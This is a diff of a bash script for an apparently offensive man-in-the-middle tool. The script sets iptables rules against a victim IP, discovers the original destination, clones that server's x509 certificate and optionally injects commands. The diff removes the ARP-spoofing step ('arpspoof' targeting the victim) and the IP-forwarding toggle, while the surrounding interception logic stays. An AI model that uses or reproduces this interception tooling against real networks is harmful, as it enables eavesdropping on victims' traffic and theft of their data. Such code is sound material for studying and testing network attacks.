@@ -47,7 +47,6 @@ if [ ! -z "$INJECT_COMMAND" ] ; then
     INJECT_COMMAND="-j \"$INJECT_COMMAND\""
 fi
 
-IP_FORWARD="$(cat /proc/sys/net/ipv4/ip_forward)"
 SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
 
 set_iptables_1 () {
@@ -69,9 +68,6 @@ function finish {
     set +e
     set_iptables_1 D 2> /dev/null 1>&2
     set_iptables_2 D 2> /dev/null 1>&2
-    printf "%s" "$IP_FORWARD" > /proc/sys/net/ipv4/ip_forward
-    kill $ARP_PID_1 2> /dev/null 1>&2
-    #kill $ARP_PID_2 2> /dev/null 1>&2
     pkill -P $$
     echo "[*] Done."
 }
@@ -87,10 +83,6 @@ function create_self_signed_cert {
 }
 
 echo "[*] To receive connections as a MitM is up to you!"
-
-echo "[*] Turning on IP forwarding..."
-
-echo 1 > /proc/sys/net/ipv4/ip_forward
 
 echo "[*] Set iptables rules for SYN packets..."
 
@@ -110,11 +102,6 @@ if [ -z "$ORIGINAL_DEST" ] ; then
 fi
 
 echo "[+] Got it! Original destination is $ORIGINAL_DEST"
-
-echo "[*] Spoofing arp replies for victim at original destination..."
-
-arpspoof -i "$IFACE" -t "$ORIGINAL_DEST" "$VICTIM_IP" 2>/dev/null 1>&2 &
-ARP_PID_1=$!
 
 echo "[*] Clone the x509 certificate of the original destination..."
 
